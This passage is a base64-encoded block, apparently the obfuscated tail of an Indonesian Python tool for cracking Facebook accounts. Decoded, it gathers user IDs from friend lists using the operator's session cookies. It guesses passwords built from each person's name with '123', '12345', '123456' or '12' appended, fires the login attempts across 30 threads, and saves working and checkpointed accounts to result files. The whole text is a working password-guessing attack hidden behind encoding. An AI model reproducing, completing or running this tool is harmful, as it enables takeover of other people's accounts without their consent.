iAgICAgICAgICAgICAgICAgICBlbGlmIHRhbnlhID09ICc1JzoKICAgICAgICAgICAgICAgICAgICAgICAgIGtuZiA9IGlucHV0KCJcMDMzWzkwbT4gXDAzM1swMG1Vc2VybmFtZS9JZCA6IFwwMzNbMTs5Mm0iKQogICAgICAgICAgICAgICAgICAgICAgICAgaWYga25mLmlzZGlnaXQoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9ICIvcHJvZmlsZS5waHA/aWQ9IiArIGtuZgogICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9ICIvIiArIGtuZgogICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gcGFyc2VyKHJlcXVlc3RzLmdldChtYmFzaWMuZm9ybWF0KHVzZXIpLGNvb2tpZXM9a3VraSkuY29udGVudCwiaHRtbC5wYXJzZXIiKS5maW5kKCdhJyxzdHJpbmc9IlRlbWFuIilbImhyZWYiXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdldGlkKG1iYXNpYy5mb3JtYXQodXNlcikpCiAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgVHlwZUVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJcMDMzWzAwbVtcMDMzWzkxbSFcMDMzWzAwbV0gVXNlciB0aWRhayBhZGEgIikKICAgICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzYnOgogICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlMSA9IG9wZW4oInJlc3VsdHMtY2hlY2sudHh0IikucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUyID0gb3BlbigicmVzdWx0cy1saWZlLnR4dCIpLnJlYWQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhID0gZmlsZTEgKyBmaWxlMgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaW5hbCA9IGEuc3RyaXAoKS5zcGxpdCgiXG4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaW5hbCA9IHNldChmaW5hbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcMDMzWzAwbSBbXDAzM1sxOzkzbXtzdHIobGVuKGZpbmFsKSl9XDAzM1swMG1dIGFrdW4gdW50dWsgZGlwZXJpa3NhICIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTEwKSBhcyBleDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgdXNlciBpbiBmaW5hbDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEgPSB1c2VyLnNwbGl0KCJ8IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4LnN1Ym1pdChsb2dpbiwoYVswXSksKGFbMV0pLChUcnVlKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKCJyZXN1bHRzLWNoZWNrLnR4dCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgicmVzdWx0cy1saWZlLnR4dCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB4IGluIGxpZmU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdyZXN1bHRzLWxpZmUudHh0JywnYScpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHgrJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gY2hlazoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHMtY2hlY2sudHh0JywnYScpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHgrIlxuIikKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcblwwMzNbMDBtW1wwMzNbOTJt4pyTXDAzM1swMG1dIERvbmUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1s5MG0+IFwwMzNbMDBtc2F2ZWQgdG8gXDAzM1sxOzkzbXJlc3VsdHMtY2hlY2sudHh0XDAzM1s5MG18XDAzM1sxOzkybXJlc3VsdHMtbGlmZS50eHQiKQogICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJcMDMzWzAwbVtcMDMzWzkxbSFcMDMzWzAwbV0ga2FtdSB0aWRhayBtZW5kYXBhdGthbiBoYXNpbCIpCiAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiXDAzM1swMG1bXDAzM1s5MW0hXDAzM1swMG1dIHBpbGloYW4geWFuZyBzYWxhaCIpCiAgICAgICAgICAgICAgICAgICBwcmludCgpCiAgICAgICAgICAgICAgICAgICBleHBhc3MgPSBpbnB1dCgiXDAzM1s5MG0+IFwwMzNbMDBtRXh0cmEgUGFzc3dvcmQ6IFwwMzNbMTs5Mm0iKQogICAgICAgICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4OgogICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB1c2VyIGluIHVzZXJuYW1lOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcnMgPSB1c2VyLnNwbGl0KCd8JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNzID0gdXNlcnNbMF0uc3BsaXQoJyAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gc3M6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpc3RwYXNzID0gWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cih4KSArICcxMjMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cih4KSArICcxMjM0NScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyMzQ1NicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpc3RwYXNzLmFwcGVuZChleHBhc3MpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBwYXNzdyBpbiBzZXQobGlzdHBhc3MpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4LnN1Ym1pdChsb2dpbiwodXNlcnNbMV0pLChwYXNzdykpCiAgICAgICAgICAgICAgICAgICBpZiBjaGVjayAhPSAwIG9yIHJlc3VsdCAhPSAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5NG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzAwbSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcblwwMzNbMDBtW1wwMzNbOTJt4pyTXDAzM1swMG1dIERvbmUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1swMG1bXDAzM1s5Mm3inJNcMDMzWzAwbV1saWZlIDogXDAzM1s5Mm1yZXN1bHRzLWxpZmUudHh0XDAzM1swMG0iKQogICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1swMG1bXDAzM1s5MW0hXDAzM1swMG1dY2hlY2twb2ludCA6IFwwMzNbOTNtcmVzdWx0cy1jaGVjay50eHRcMDMzWzAwbSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcblxuIikKICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcMDMzWzE7OTRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swMG0iKQogICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG5cMDMzWzAwbVtcMDMzWzkybeKck1wwMzNbMDBtXSBEb25lIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMDBtW1wwMzNbOTFtIVwwMzNbMDBtXSBubyByZXN1bHQiKQogICAgICAgICAgICAgICBleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKICAgICAgICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIlwwMzNbMDBtW1wwMzNbOTFtIVwwMzNbMDBtXSBUaWRhayBhZGEga29uZWtzaSIpCgogICAgZWxpZiBmID09ICIyIjoKICAgICAgICAgb3Muc3lzdGVtKCJweXRob24gTWFpbC5weSIpCiAgICAgICAgIGJhbGlrKCkKCiAgICBlbGlmIGYgPT0gIjMiOgogICAgICAgICBvcy5zeXN0ZW0oImdpdCBwdWxsIikKICAgICAgICAgYmFsaWsoKQoKICAgIGVsaWYgZiA9PSAiNCI6CiAgICAgICAgIHN5cy5leGl0KCJcMDMzWzAwbVtcMDMzWzkxbSFcMDMzWzAwbV1cMDMzWzkxbWV4aXRcMDMzWzAwbSIpCgogICAgZWxzZToKICAgICAgICAgYmFsaWsoKSAgCgoKaWYgX19uYW1lX189PSJfX21haW5fXyI6CiAgICAgY2xlYXIoKQogICAgIGJhbmVyKCkKICAgICBjcmFjaygpCiAgICAgYmFsaWsoKQ=='))
